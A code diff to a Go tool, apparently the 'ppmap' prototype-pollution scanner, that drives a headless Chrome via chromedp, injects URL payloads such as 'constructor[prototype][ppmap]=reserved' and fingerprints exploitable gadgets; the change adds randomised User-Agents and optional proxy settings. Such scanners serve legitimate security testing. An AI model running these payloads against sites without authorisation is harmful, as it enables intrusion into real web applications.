@@ -3,7 +3,9 @@ import"os"
 import "bufio"
 import (
     "context"
+    "math/rand"
     "log"
+    "fmt"
     "github.com/chromedp/chromedp"
     "strings"
     "time"
@@ -64,8 +66,8 @@ var fingerprint string = `(() => {
 `
 
 func main() {
-    log.Printf(`                                                                                 
-    dMMMMb  dMMMMb  dMMMMMMMMb  .aMMMb  dMMMMb     v1.0.1
+    fmt.Printf(`                                                                                 
+    dMMMMb  dMMMMb  dMMMMMMMMb  .aMMMb  dMMMMb     v1.1.0
    dMP.dMP dMP.dMP dMP"dMP"dMP dMP"dMP dMP.dMP 
   dMMMMP" dMMMMP" dMP dMP dMP dMMMMMP dMMMMP"  
  dMP     dMP     dMP dMP dMP dMP dMP dMP           
@@ -76,6 +78,23 @@ dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e
     
     time.Sleep(2 * time.Second)
     var quote string
+    
+    rand.Seed(time.Now().Unix())
+    //feel free to add more User-Agents
+    useragents := []string{
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
+        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+        "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
+        "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
+    }
+    
+    n := rand.Int() % len(useragents)
     
     payloads := [4]string{
         "constructor%5Bprototype%5D%5Bppmap%5D=reserved",
@@ -99,8 +118,21 @@ dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e
         for index, payload := range payloads {
             _ = index
             url := string(u) + string(quote) + string(payload)
-            ctx, cancel := chromedp.NewContext(context.Background())
-            defer cancel()
+
+	    opts := append(chromedp.DefaultExecAllocatorOptions[:],
+		//uncomment the following lines to setup a proxy
+		//chromedp.ProxyServer("localhost:8080"),
+		//chromedp.Flag("ignore-certificate-errors", true),
+		chromedp.UserAgent(useragents[n]),
+	    )
+	    ctx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
+	    defer cancel()
+	    ctx, cancel = chromedp.NewContext(
+		ctx,
+		// uncomment the next line to see the CDP messages
+		//chromedp.WithDebugf(log.Printf),
+	    )
+	    defer cancel()
 
             // run task list
             var res string
@@ -117,10 +149,11 @@ dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e
             time.Sleep(1 * time.Second)
             //now its fingerprinting time
             log.Printf(Info + " Fingerprinting the gadget...")
-            time.Sleep(3 * time.Second)
             var res1 string
             err1 := chromedp.Run(ctx,
                 chromedp.Navigate(u),
+                //change the value 5 to a higher one if your internet connection is slow
+                chromedp.Sleep(5*time.Second),
                 chromedp.Evaluate(fingerprint, &res1),
             )
             if err1 != nil {
